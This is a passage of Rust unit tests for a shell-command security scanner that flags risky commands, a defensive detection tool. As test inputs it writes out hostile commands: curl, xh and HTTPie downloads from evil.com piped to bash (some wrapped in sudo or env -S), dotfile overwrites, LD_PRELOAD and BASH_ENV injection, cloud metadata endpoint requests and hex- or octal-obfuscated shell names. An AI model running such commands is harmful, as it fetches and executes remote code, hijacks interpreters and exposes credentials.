                facts.uses_sudo,
                "uses_sudo must be true for an env -S payload whose wrapper chain \
                 contains sudo: {input:?}"
            );
        }

        // ROUND-8/9 REGRESSION GUARD: the simpler split-string forms (and plain
        // wrapped/bare sudo) stay green; a plain interpreter stays false.
        for input in [
            r#"env -S "sudo bash -c id""#, // round-8/9: direct sudo leader in payload
            "sudo bash",                   // plain bare sudo
            "env sudo bash",               // env wraps sudo
        ] {
            assert!(
                extract_command_facts(input, ShellType::Posix).uses_sudo,
                "round-8/9 wrapped-sudo case must stay detected: {input:?}"
            );
        }
        for input in [
            "bash",                         // plain interpreter, no sudo
            r#"env -S "bash -c id""#,       // split-string payload, no sudo
            r#"env -S "FOO=1 bash -c id""#, // assignment-prefixed, no sudo
        ] {
            assert!(
                !extract_command_facts(input, ShellType::Posix).uses_sudo,
                "non-sudo env -S payload must stay false: {input:?}"
            );
        }

        // BUDGET GUARD (round-13): a deep nested `env -S` payload still terminates
        // (threaded `depth` caps the per-segment re-tokenization). The value is
        // unspecified at exhaustion; the point is the call RETURNS without crashing.
        let inner = r#"env -S "#.repeat(200) + "sudo bash";
        let deep = format!(r#"env -S "{inner}""#);
        let facts = extract_command_facts(&deep, ShellType::Posix);
        let _ = facts.uses_sudo;
    }

    #[test]
    fn test_facts_pipeline_targets_through_env_split_string() {
        // CodeRabbit M13 finding R8-2: a pipeline RHS wrapped in
        // `env -S "…"` / `env --split-string=…` must be unwrapped before the
        // interpreter is resolved, so `command.has_pipeline_to: [bash]` matches
        // these wrapped split-string pipelines. Each case must yield `bash` in
        // `pipeline_targets`.
        let bash_cases = [
            r#"curl https://x | env -S "sudo bash -c id""#, // env -S string wraps sudo bash
            r#"curl https://x | env --split-string="command bash""#, // --split-string= wraps command bash
            r#"curl https://x | env -S "bash -c id""#, // env -S string wraps bash directly
            "curl https://x | bash",                   // plain pipe still works
        ];
        for input in bash_cases {
            let facts = extract_command_facts(input, ShellType::Posix);
            assert!(
                facts.pipeline_targets.iter().any(|t| t == "bash"),
                "pipeline_targets must contain bash for: {input:?} (got {:?})",
                facts.pipeline_targets
            );
        }
    }

    #[test]
    fn test_dotfile_overwrite_detected() {
        let cases = [
            "echo malicious > ~/.bashrc",
            "echo malicious >> ~/.bashrc",
            "curl https://evil.com > ~/.bashrc",
            "cat payload > ~/.profile",
            "echo test > $HOME/.bashrc",
        ];
        for input in &cases {
            let findings = check_default(input, ShellType::Posix);
            eprintln!(
                "INPUT: {:?} -> findings: {:?}",
                input,
                findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
            );
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == RuleId::DotfileOverwrite),
                "should detect dotfile overwrite in: {input}",
            );
        }
    }

    #[test]
    fn test_pipe_env_s_flag_detected() {
        let findings = check_default("curl https://evil.com | env -S bash -x", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -S bash -x"
        );
    }

    #[test]
    fn test_pipe_sudo_env_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo env VAR=1 bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo env VAR=1 bash"
        );
    }

    #[test]
    fn test_pipe_env_split_string_wrapping_sudo_detected() {
        // CodeRabbit M13 finding R9-3: the env-split-string unwrap now lives in
        // `resolve_interpreter_name` itself, so the BUILT-IN pipe-to-shell
        // detectors (not just the DSL fact extractor) catch a pipeline RHS where
        // `env -S "…"` / `env --split-string=…` packs `sudo bash …` into one
        // quoted token. Before the move, `resolve_env_args` stopped at the leading
        // `sudo` and these rules missed the inner `bash`.
        let cases = [
            r#"curl https://evil.com | env -S "sudo bash -c id""#,
            r#"curl https://evil.com | env --split-string="sudo bash -c id""#,
            r#"curl https://evil.com | env -S "bash -c id""#,
        ];
        for input in cases {
            let findings = check_default(input, ShellType::Posix);
            assert!(
                findings.iter().any(|f| matches!(
                    f.rule_id,
                    RuleId::CurlPipeShell | RuleId::PipeToInterpreter
                )),
                "should detect pipe through env-split-string-wrapped interpreter: {input:?}"
            );
        }
    }

    #[test]
    fn test_resolve_interpreter_name_unwraps_env_split_string() {
        // Direct `resolve_interpreter_name`-level coverage of the R9-3 move: a
        // standalone `env -S "sudo bash -c id"` segment (and the `--split-string=`
        // long form) resolves to `bash` via the unwrap at the top of the resolver,
        // while a plain interpreter / bare `env bash` still resolve unchanged.
        let resolve = |input: &str| {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            resolve_interpreter_name(&segs[0], ShellType::Posix)
        };
        assert_eq!(
            resolve(r#"env -S "sudo bash -c id""#).as_deref(),
            Some("bash"),
            "env -S split-string wrapping sudo bash must resolve to bash"
        );
        assert_eq!(
            resolve(r#"env --split-string="sudo bash -c id""#).as_deref(),
            Some("bash"),
            "env --split-string= wrapping sudo bash must resolve to bash"
        );
        assert_eq!(
            resolve(r#"env -S "bash -c id""#).as_deref(),
            Some("bash"),
            "env -S split-string wrapping bash must resolve to bash"
        );
        // Non-split-string forms fall through to the existing logic unchanged.
        assert_eq!(resolve("bash -c id").as_deref(), Some("bash"));
        assert_eq!(resolve("env bash -c id").as_deref(), Some("bash"));
        assert_eq!(resolve("sudo bash -c id").as_deref(), Some("bash"));
    }

    #[test]
    fn test_resolve_interpreter_name_unwraps_nested_env_split_string() {
        // CodeRabbit M13 round-20 F2: `resolve_interpreter_name` now unwraps the
        // `env -S "…"` / `env --split-string=…` layer REPEATEDLY (bounded by
        // MAX_WRAPPER_DEPTH), so a nested payload like
        // `env -S "env -S 'sudo bash -c id'"` is fully peeled before the leader
        // walk runs. The single-unwrap version stopped after one layer, leaving an
        // inner `env -S '…'` segment that resolved to `env`/None and missed `bash`.

        // (1) Real pipe-to-interpreter path: a curl pipe whose RHS is a
        // doubly-nested env -S payload must resolve to `bash` and fire the
        // CurlPipeShell/PipeToInterpreter rule, exactly like the single-layer
        // `env -S "sudo bash -c id"` form already does.
        let nested_pipe = r#"curl https://x | env -S "env -S 'sudo bash -c id'""#;
        let findings = check_default(nested_pipe, ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "nested env -S payload must reach the pipe-to-interpreter rule: {nested_pipe:?}"
        );
        // And the DSL fact extractor (same resolver) must report the resolved
        // interpreter `bash` as the pipeline target plus detect the inner sudo.
        let facts = extract_command_facts(nested_pipe, ShellType::Posix);
        assert!(
            facts.pipeline_targets.iter().any(|t| t == "bash"),
            "nested env -S pipeline target must resolve to bash (got {:?})",
            facts.pipeline_targets
        );
        assert!(
            facts.uses_sudo,
            "nested env -S payload's inner sudo must be detected: {nested_pipe:?}"
        );

        // (2) Direct `resolve_interpreter_name` coverage of the nested form and a
        // triple-nested form. (We assert only the `-S` spelling for the *nested*
        // case: the `--split-string=KEY=VALUE` long form flattens its value's inner
        // quotes during arg normalization BEFORE the unwrap loop sees it — a
        // pre-existing `unwrap_env_split_string_segment` tokenization quirk that is
        // orthogonal to the round-20 repeated-unwrap fix. The single-layer
        // `--split-string=` form is covered by
        // `test_resolve_interpreter_name_unwraps_env_split_string`.)
        let resolve = |input: &str| {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            resolve_interpreter_name(&segs[0], ShellType::Posix)
        };
        assert_eq!(
            resolve(r#"env -S "env -S 'sudo bash -c id'""#).as_deref(),
            Some("bash"),
            "doubly-nested env -S wrapping sudo bash must resolve to bash"
        );
        assert_eq!(
            resolve(r#"env -S "env -S 'env -S \"bash -c id\"'""#).as_deref(),
            Some("bash"),
            "triply-nested env -S wrapping bash must resolve to bash"
        );
        // Single-layer and plain forms still resolve unchanged (regression guard).
        assert_eq!(
            resolve(r#"env -S "sudo bash -c id""#).as_deref(),
            Some("bash")
        );
        assert_eq!(resolve("bash -c id").as_deref(), Some("bash"));

        // BUDGET GUARD: a split-string payload nested FAR past MAX_WRAPPER_DEPTH
        // must terminate (the repeated-unwrap loop is bounded). The point is the
        // call RETURNS without spinning/overflowing; the value at exhaustion is
        // unspecified.
        let inner = "env -S ".repeat(500) + "bash -c id";
        let deep = format!("env -S '{inner}'");
        let segs = tokenize::tokenize(&deep, ShellType::Posix);
        let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
    }

    #[test]
    fn test_resolve_interpreter_name_peels_env_split_string_behind_wrapper() {
        // CodeRabbit M13 round-21 F2: `resolve_interpreter_name`'s peel loop used
        // to apply `unwrap_env_split_string_segment` ONLY when the current segment
        // was ITSELF an `env -S` form. So an env-S nested BEHIND another wrapper
        // (`sudo env -S "…"`, `command env -S "…"`) was never peeled, and when its
        // payload carried its OWN wrapper chain (e.g. `sudo bash`), the inner
        // interpreter was missed: the leader walk's `resolve_env_args` saw
        // `normalize_cmd_base("sudo bash …") == "sudo"`, not an interpreter, and
        // gave up. The loop now peels generic wrappers AND env-S in the same
        // bounded pass, so the inner interpreter is exposed.
        let resolve_last = |input: &str| {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            resolve_interpreter_name(segs.last().unwrap(), ShellType::Posix)
        };

        // (1) Real pipe path: `curl … | sudo env -S "bash -c id"` resolves the
        // interpreter to `bash`, so pipeline_targets contains `bash`, uses_sudo is
        // true, and CurlPipeShell/PipeToInterpreter fires.
        let pipe = r#"curl https://x | sudo env -S "bash -c id""#;
        let findings = check_default(pipe, ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "env -S behind sudo must reach the pipe-to-interpreter rule: {pipe:?}"
        );
        let facts = extract_command_facts(pipe, ShellType::Posix);
        assert!(
            facts.pipeline_targets.iter().any(|t| t == "bash"),
            "pipeline target for `sudo env -S \"bash …\"` must be bash (got {:?})",
            facts.pipeline_targets
        );
        assert!(
            facts.uses_sudo,
            "the leading sudo in `sudo env -S \"bash …\"` must be detected: {pipe:?}"
        );

        // (2) A wrapper-then-env-S-then-NESTED-env-S composition resolves correctly:
        // peel sudo → env -S → (payload's own env -S) → bash.
        for input in [
            r#"sudo env -S "bash -c id""#,               // sudo → env -S → bash
            r#"command env -S "bash -c id""#,            // command → env -S → bash
            r#"sudo env -S "sudo bash -c id""#,          // sudo → env -S → sudo bash → bash
            r#"command env -S "sudo bash -c id""#,       // command → env -S → sudo bash → bash
            r#"sudo env -S "env -S 'bash -c id'""#,      // sudo → env -S → (env -S) → bash
            r#"sudo env -S "env -S 'sudo bash -c id'""#, // sudo → env -S → (env -S → sudo bash) → bash
        ] {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            assert_eq!(
                resolve_interpreter_name(&segs[0], ShellType::Posix).as_deref(),
                Some("bash"),
                "env -S behind a wrapper must resolve to the inner interpreter: {input:?}"
            );
        }
        // Same compositions on a pipeline RHS resolve their target to bash.
        for input in [
            r#"curl https://x | command env -S "sudo bash -c id""#,
            r#"curl https://x | sudo env -S "env -S 'bash -c id'""#,
        ] {
            assert_eq!(
                resolve_last(input).as_deref(),
                Some("bash"),
                "pipeline RHS env -S behind a wrapper must resolve to bash: {input:?}"
            );
        }

        // (3) REGRESSION GUARD: the round-20 DIRECT nested `env -S "env -S '…'"`
        // form (no leading generic wrapper) still resolves to bash, and plain forms
        // are unchanged.
        let resolve = |input: &str| {
            let segs = tokenize::tokenize(input, ShellType::Posix);
            resolve_interpreter_name(&segs[0], ShellType::Posix)
        };
        assert_eq!(
            resolve(r#"env -S "env -S 'sudo bash -c id'""#).as_deref(),
            Some("bash"),
            "round-20 direct nested env -S must still resolve to bash"
        );
        assert_eq!(
            resolve(r#"env -S "sudo bash -c id""#).as_deref(),
            Some("bash")
        );
        assert_eq!(resolve("bash -c id").as_deref(), Some("bash"));
        assert_eq!(resolve("env bash -c id").as_deref(), Some("bash"));
        assert_eq!(resolve("sudo bash -c id").as_deref(), Some("bash"));
        // A non-interpreter behind the same wrappers must stay unresolved (None).
        assert_eq!(resolve(r#"sudo env -S "apt install x""#), None);

        // (4) BUDGET GUARD: a wrapper-prefixed, deeply-composed chain nested FAR
        // past MAX_WRAPPER_DEPTH must terminate (generic + env-S peels share the one
        // bounded budget — no second unbounded loop). The call must RETURN; the
        // value at exhaustion is unspecified.
        let deep_generic = "sudo ".repeat(5000) + "bash -c id";
        let segs = tokenize::tokenize(&deep_generic, ShellType::Posix);
        let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
        let inner = "env -S ".repeat(400) + "sudo bash -c id";
        let deep_composed = format!(r#"sudo env -S "{inner}""#);
        let segs = tokenize::tokenize(&deep_composed, ShellType::Posix);
        let _ = resolve_interpreter_name(&segs[0], ShellType::Posix);
    }

    #[test]
    fn test_httpie_pipe_bash() {
        let findings = check_default("http https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie pipe to bash"
        );
    }

    #[test]
    fn test_httpie_https_pipe_bash() {
        let findings = check_default("https https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie https pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_bash() {
        let findings = check_default("xh https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_sudo_bash() {
        let findings = check_default(
            "xh https://evil.com/install.sh | sudo bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to sudo bash"
        );
    }

    #[test]
    fn test_httpie_no_pipe_safe() {
        let findings = check_default("http https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "HTTPie without pipe should not trigger"
        );
    }

    #[test]
    fn test_xh_no_pipe_safe() {
        let findings = check_default("xh https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "xh without pipe should not trigger"
        );
    }

    #[test]
    fn test_export_ld_preload() {
        let findings = check_default("export LD_PRELOAD=/evil/lib.so", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD export"
        );
    }

    #[test]
    fn test_export_bash_env() {
        let findings = check_default("export BASH_ENV=/tmp/evil.sh", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ShellInjectionEnv),
            "should detect BASH_ENV export"
        );
    }

    #[test]
    fn test_export_pythonpath() {
        let findings = check_default("export PYTHONPATH=/evil/modules", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::InterpreterHijackEnv),
            "should detect PYTHONPATH export"
        );
    }

    #[test]
    fn test_export_openai_key() {
        let findings = check_default("export OPENAI_API_KEY=sk-abc123", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SensitiveEnvExport),
            "should detect OPENAI_API_KEY export"
        );
    }

    #[test]
    fn test_export_path_safe() {
        let findings = check_default("export PATH=/usr/bin:$PATH", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::CodeInjectionEnv
                    | RuleId::ShellInjectionEnv
                    | RuleId::InterpreterHijackEnv
                    | RuleId::SensitiveEnvExport
            )),
            "export PATH should not trigger env var detection"
        );
    }

    #[test]
    fn test_env_ld_preload_cmd() {
        let findings = check_default(
            "env LD_PRELOAD=/evil/lib.so /usr/bin/target",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD via env command"
        );
    }

    #[test]
    fn test_curl_metadata_endpoint() {
        let findings = check_default(
            "curl http://169.254.169.254/latest/meta-data",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect AWS metadata endpoint"
        );
    }

    #[test]
    fn test_curl_private_network() {
        let findings = check_default("curl http://10.0.0.1/internal/api", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
            "should detect private network access"
        );
    }

    #[test]
    fn test_curl_public_ip_safe() {
        let findings = check_default("curl http://8.8.8.8/dns-query", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::MetadataEndpoint | RuleId::PrivateNetworkAccess
            )),
            "public IP should not trigger network destination detection"
        );
    }

    #[test]
    fn test_metadata_bare_ip() {
        let findings = check_default("curl 169.254.169.254/latest/meta-data", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect bare IP metadata endpoint"
        );
    }

    #[test]
    fn test_extract_host_from_url() {
        assert_eq!(
            extract_host_from_arg("http://169.254.169.254/latest"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("http://10.0.0.1:8080/api"),
            Some("10.0.0.1".to_string())
        );
        assert_eq!(
            extract_host_from_arg("169.254.169.254/path"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("8.8.8.8"),
            Some("8.8.8.8".to_string())
        );
        assert_eq!(extract_host_from_arg("-H"), None);
        assert_eq!(extract_host_from_arg("output.txt"), None);
    }

    #[test]
    fn test_network_policy_deny_exact() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_subdomain() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "wget https://sub.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_cidr() {
        let deny = vec!["10.0.0.0/8".to_string()];
        let allow = vec![];
        let findings =
            check_network_policy("curl http://10.1.2.3/api", ShellType::Posix, &deny, &allow);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_allow_exempts() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec!["safe.evil.com".to_string()];
        let findings = check_network_policy(
            "curl https://safe.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0, "allow list should exempt from deny");
    }

    #[test]
    fn test_network_policy_no_match() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://example.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn test_network_policy_empty_deny() {
        let deny = vec![];
        let allow = vec![];
        let findings =
            check_network_policy("curl https://evil.com", ShellType::Posix, &deny, &allow);
        assert_eq!(
            findings.len(),
            0,
            "empty deny list should produce no findings"
        );
    }

    #[test]
    fn test_cidr_contains() {
        assert_eq!(cidr_contains("10.0.0.1", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("10.255.255.255", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("11.0.0.1", "10.0.0.0/8"), Some(false));
        assert_eq!(cidr_contains("192.168.1.1", "192.168.0.0/16"), Some(true));
        assert_eq!(cidr_contains("192.169.1.1", "192.168.0.0/16"), Some(false));
        assert_eq!(cidr_contains("not-an-ip", "10.0.0.0/8"), None);
        assert_eq!(cidr_contains("10.0.0.1", "invalid"), None);
    }

    #[test]
    fn test_matches_network_list_hostname() {
        let list = vec!["evil.com".to_string(), "bad.org".to_string()];
        assert!(matches_network_list("evil.com", &list));
        assert!(matches_network_list("sub.evil.com", &list));
        assert!(!matches_network_list("notevil.com", &list));
        assert!(!matches_network_list("good.com", &list));
    }

    #[test]
    fn test_flag_value_url_detected_in_network_policy() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl --url=http://evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1, "should detect denied host in --flag=URL");
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_catches_scp_host_path() {
        // scp/rsync remote specs need their own parser path because
        // `extract_host_from_arg` only handles scheme-ful URLs and bare IPs.
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "scp evil.com:/payload /tmp/out",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(
            findings.len(),
            1,
            "scp host:path must be visible to network_deny"
        );
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_catches_scp_user_at_host_path() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "scp user@evil.com:/payload /tmp/out",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_catches_rsync_host_path() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "rsync -av src evil.com:/dest/",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_scp_allow_exempts() {
        // Allow list still exempts scp destinations.
        let deny = vec!["evil.com".to_string()];
        let allow = vec!["evil.com".to_string()];
        let findings = check_network_policy(
            "scp evil.com:/payload /tmp/out",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert!(findings.is_empty());
    }

    #[test]
    fn test_network_policy_catches_sudo_wrapped_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "sudo curl https://evil.com/payload -o /tmp/out",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_catches_sudo_wrapped_scp() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "sudo scp evil.com:/payload /tmp/out",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_catches_sudo_u_flagged_curl() {
        // Ensures the sudo resolver handles -u user.
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "sudo -u nobody curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_network_policy_catches_doas_wrapped_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "doas curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_network_policy_catches_env_wrapped_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "env curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_network_policy_catches_env_with_assignment_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "env FOO=1 curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_network_policy_catches_time_wrapped_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "time curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_network_policy_catches_command_wrapped_curl() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "command curl https://evil.com/payload",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_flag_value_url_metadata_endpoint() {
        let findings = check(
            "curl --url=http://169.254.169.254/latest/meta-data",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect metadata endpoint in --flag=URL"
        );
    }

    #[test]
    fn test_flag_value_url_private_network() {
        let findings = check(
            "curl --url=http://10.0.0.1/internal",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
            "should detect private network in --flag=URL"
        );
    }

    #[test]
    fn test_strip_port_unbracketed_ipv6() {
        assert_eq!(strip_port("fe80::1"), "fe80::1");
    }

    #[test]
    fn test_vet_not_configured_fires_without_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_suppressed_with_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let sc_dir = dir.path().join("supply-chain");
        std::fs::create_dir_all(&sc_dir).unwrap();
        std::fs::write(sc_dir.join("config.toml"), "").unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_skips_non_install() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo build",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_with_flags() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo --locked install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo +nightly add tokio",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f3 = check(
            "cargo -Z sparse-registry install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f3.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_skipped_in_paste_context() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Paste,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_no_false_positive_on_non_install_subcommand() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo test --package add",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo build install",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_exe_windows_path() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            r"C:\Users\dev\.cargo\bin\cargo.exe install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect cargo.exe with Windows backslash path"
        );
        let f2 = check(
            r"C:\Users\dev\.cargo\bin\CARGO.EXE install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect CARGO.EXE case-insensitively"
        );
    }

    #[test]
    fn test_normalize_ansi_c_basic() {
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_ansi_c_hex() {
        assert_eq!(
            normalize_shell_token("$'\\x62\\x61\\x73\\x68'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_octal() {
        assert_eq!(
            normalize_shell_token("$'\\142\\141\\163\\150'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_octal_leading_zero() {
        // \057 = '/' (octal 057 = 47 decimal = '/')
        assert_eq!(
            normalize_shell_token("$'\\057bin\\057bash'", ShellType::Posix),
            "/bin/bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_bare_zero() {
        // \0 alone (no following octal digits) should still be NUL
